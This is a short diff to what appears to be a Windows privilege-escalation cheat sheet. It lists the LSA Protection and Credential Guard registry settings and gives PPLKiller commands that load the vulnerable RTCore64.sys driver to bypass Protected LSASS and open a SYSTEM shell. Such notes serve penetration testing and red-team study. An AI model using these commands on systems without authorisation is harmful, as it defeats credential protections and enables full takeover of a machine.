@@ -311,8 +311,8 @@ PrivEsc
       LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
       Credential Guard: LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
   
-  Bypass Protected LSASS
-    Execute:PPLKiller /InstallDriver (loads RTCore64.sys driver)
+  Bypass Protected LSASS (may not work)
+    Execute:PPLKiller /installDriver (loads RTCore64.sys driver)
     Execute: PPLKiller /makeSYSTEMcmd (Gets SYSTEM shell
     Execute: PPLKiller /uninstallDriver (removes driver)
   
